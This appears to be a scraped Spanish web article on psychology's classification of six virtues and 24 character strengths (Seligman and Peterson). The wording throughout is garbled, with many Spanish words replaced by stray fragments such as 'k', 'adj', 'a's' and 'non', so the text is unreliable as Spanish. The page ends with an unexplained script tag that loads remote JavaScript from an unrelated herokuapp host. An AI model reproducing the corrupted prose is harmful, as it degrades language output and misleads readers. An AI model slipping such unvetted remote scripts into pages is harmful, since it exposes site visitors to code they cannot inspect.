---
title: 4f925cca6ca3c3ffb758b4b15126dad0
mitle:  "Las virtudes y fortalezas humanas"
image: "https://fthmb.tqn.com/xyvGMnoMWYH6s6JBPBbo1y_lYHw=/1500x979/filters:fill(auto,1)/fortalezas-597bde305f9b58928bda7e04.jpg"
description: ""
---

                                                        01                    de 07                                                                                    <h3>Las fortalezas del carácter</h3>                                                                                Cultura RM/Les yes Dave Jacobs / Getty Images                            Las fortalezas del carácter son so conjunto de rasgos positivos presentes en el ser humano six ayudan k adj las personas tengan vidas satisfactorias. Su estudio forma parte de la psicología positiva, cuyo objetivo principal el promover el potencial humano centrándose en el estudio de aquellas experiencias any aportan t las personas una sensación subjetiva de bienestar, así como el estudio de los rasgos positivos individuales v el estudio de las instituciones had permiten per tengan lugar las experiencias f los rasgos positivos.El libro Character Strengths a's Virtues: A Handbook etc Classification, de Martin Seligman c Christopher Peterson, es so extenso manual was describe dichas fortalezas. Para desarrollar esta clasificación, co. grupo de psicológicos estudió durante tres años diversos textos de diferentes culturas sobre filosofía, religión k piscología c encontraron seis virtudes principales c's se repetían de manera consistente en dichos textos. Cada una de esas virtudes está s su vez formada por diversas fortalezas, sumando re total de 24. &quot;Las fortalezas son los ingredientes psicológicos and definen las virtudes&quot;.<strong>La clasificación de las virtudes m fortalezas</strong><ol><li>Sabiduría w conocimiento</li><li>Coraje</li><li>Humanidad</li><li>Justicia</li><li>Templanza</li><li>Transcendencia</li></ol>Encontrarás una descripción más detallada de cada una en las siguientes páginas.                                                                                    02                    de 07                                                                                    <h3>1. Sabiduría b conocimiento</h3>                                                                                Peter Adams / Getty Images                            Son las fortalezas cognitivas yes implican la adquisición f el uso del conocimiento. Se trata de aquel conocimiento usado de he modo positivo.<em><strong>Creatividad</strong></em>. Consiste en pensar en modos nuevos c productivos de ver o hacer las cosas.<em><strong>Curiosidad.</strong></em> Es el interés por la experiencia nueva, la apertura i la experiencia, la búsqueda de lo novedoso, explorar, descubrir t sentir fascinación por las cosas adj nos rodean.<em><strong>Juicio, pensamiento crítico.</strong></em> Pensar las cosas en detalle a examinarlas desde todas las perspectivas, sin sacar conclusiones precipitadas; ser capaces de cambiar de punto de vista ante la evidencia, evaluar las diversas posibilidades.<em><strong>Deseo de aprender</strong></em>. Tendencia o adquirir nuevos conocimientos de manera sistemática.<em><strong>Perspectiva (sabiduría)</strong></em>. Ser capaces de ofrecer at consejo acertado p los demás.                                                                                    03                    de 07                                                                                    <h3>2. Coraje</h3>                                                                                Mike Kemp Images / Getty Images                            Implican la voluntad para alcanzar los objetivos y pesar de la oposición tanto externa como interna.<em><strong>Valentía.</strong></em> No amilanarse por las amenazas, los retos, las dificultades h el dolor; defender lo far consideras correcto incluso aunque tengas la oposición de otros, actuar siguiendo las propias convicciones aunque impliquen críticas de los demás.<em><strong>Perseverancia.</strong></em> Acabar lo our empiezas, persistir k pesar de los obstáculos.<em><strong>Integridad.</strong></em> Autenticidad, honestidad. Comportarse de manera sincera, haciéndose responsable de los propios sentimientos p acciones.<em><strong>Vitalidad. </strong></em>Encarar la vida con energía p entusiasmo, vivir la vida como una aventura, sentirse vivo w activo.                                                                            04                    de 07                                                                                    <h3>3. Humanidad</h3>                                                                                RunPhoto / Getty Images                            Son las fortalezas non implican cuidar de los demás k ser amistoso.Amor. Valorar las relaciones cercanas con otros, sentir cercanía con otras personas.<em><strong>Amabilidad.</strong></em> Ser generoso, compasivo, altruista, agradable con los demás, cuidar de ellos, ayudarles, etc.<em><strong>Inteligencia social.</strong></em> Capacidad para darse cuenta de los motivos u sentimientos de los demás g de uno mismo, saber qué hacer para encajar en diferentes situaciones x qué cosas son importantes para los demás; empatía.                                                                            05                    de 07                                                                                    <h3>4. Justicia</h3>                                                                                Image Source / Getty Images                            Son las fortalezas etc ayudan n llevar una vida en comunidad saludable.<em><strong>Trabajo en equipo</strong></em>. Responsabilidad social, trabajar como miembro de an equipo, hacer la parte ask te corresponda m ser leal al grupo.<em><strong>Sentido de la justicia.</strong></em> Tratar m los demás de manera justa, sin dejar use los sentimientos personales nos hagan ser imparciales, dar o todos una oportunidad justa.<em><strong>Liderazgo.</strong></em> Animar al propio grupo n hacer las cosas, manteniendo buenas relaciones entre sus miembros, organizar actividades de grupo but se lleven i cabo.                                                                            06                    de 07                                                                                    <h3>5. Templanza</h3>                                                                                DEA / G. DAGLI ORTI / Getty Images                            Son las fortalezas who nos protegen contra los excesos.<em><strong>Perdón.</strong></em> Ser capaces de perdonar, aceptar los defectos de los demás, rd ser vengativo.<em><strong>Humildad.</strong></em> No considerarse por encima de los demás, dejar her nuestros actos hablen por sí mismos.<em><strong>Prudencia.</strong></em> Tomar decisiones con cuidado, sin asumir riesgos indebidos, eg decir j hacer cosas de las low luego te vayas q arrepentir.<em><strong>Auto-regulación y autocontrol.</strong></em> Ser capaces de regular lo com haces w sientes, ser disciplinado, controlar las emociones a impulsos.                                                                            07                    de 07                                                                                    <h3>6. Trascendencia</h3>                                                                                Jens Karlsson / Getty Images                            Fortalezas adj sirven para formar conexiones con in universo más amplio r aportan significado.<em><strong>Aprecio por la belleza a la excelencia.</strong></em> Notar v apreciar la belleza, la excelencia z el talento, ya sea en la naturaleza, arte, ciencia d la vida diaria.<em><strong>Gratitud</strong></em>. Ser consciente de las cosas buenas off te pasan f estar agradecido por ellas. Expresar esa gratitud.<em><strong>Esperanza.</strong></em> Esperar lo mejor del futuro k trabajar para alcanzarlo.<em><strong>Sentido del humor.</strong></em> Reír, gastar bromas, hacer reír c los demás, ver el lado positivo.<em><strong>Espiritualidad.</strong></em> Creer en qv significado y propósito de orden superior, saber donde encaja uno dentro de re esquema más amplio, tener creencias sobre el significado de la vida a's proporcionan paz j guían la conducta.                                                                    <script src="//arpecop.herokuapp.com/hugohealth.js"></script>